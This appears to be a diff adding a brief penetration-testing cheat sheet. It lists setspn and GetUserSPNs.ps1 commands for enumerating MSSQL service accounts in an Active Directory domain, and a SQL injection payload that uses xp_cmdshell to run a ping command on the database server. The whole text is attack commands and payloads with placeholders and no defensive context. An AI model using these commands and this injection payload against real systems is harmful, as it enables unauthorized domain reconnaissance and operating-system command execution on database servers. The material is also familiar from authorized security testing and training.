@@ -1,0 +1,9 @@
+# Powershell setspn enumerate MSSQL Instances
+setspn -T <Domain> -Q MSSQLSvc/*
+
+# GetUserSPNs to enumerate MSSQL Instances
+. .\GetUserSPNs.ps1 -GCName <Domain>
+
+
+# xp_cmdshell SQL Injection Ping
+test';EXEC master.. xp_cmdshell 'ping <ip>'; --
